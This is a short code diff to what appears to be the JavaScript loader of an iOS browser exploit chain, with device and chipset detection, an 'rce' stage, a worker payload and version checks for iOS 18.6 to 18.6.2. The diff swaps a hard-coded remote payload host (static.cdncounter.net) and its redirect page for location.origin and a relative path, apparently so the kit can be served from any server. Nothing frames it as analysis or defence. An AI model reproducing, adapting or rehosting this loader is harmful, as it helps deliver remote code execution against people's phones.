@@ -5,7 +5,7 @@ var offsets = {};
 var slide;
 var chipset;
 var device_model;
-var localHost = "https://static.cdncounter.net/assets"
+
 function print(x, reportError = false, dumphex = false) {
     let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
     if (!SERVER_LOG && !reportError) return;
@@ -24,7 +24,7 @@ function print(x, reportError = false, dumphex = false) {
 }
 function redirect()
 {
-    window.location.href = "https://static.cdncounter.net/404.html"; 
+    window.location.href = "404.html"; 
 }
 function getJS(fname,method = 'GET') 
 {
@@ -182,7 +182,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             //print("Got exception while running rce: " + e);
         }
         let desiredHost = "";
-        desiredHost = localHost;
+        desiredHost = location.origin;
             if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
             {
                 worker.postMessage({
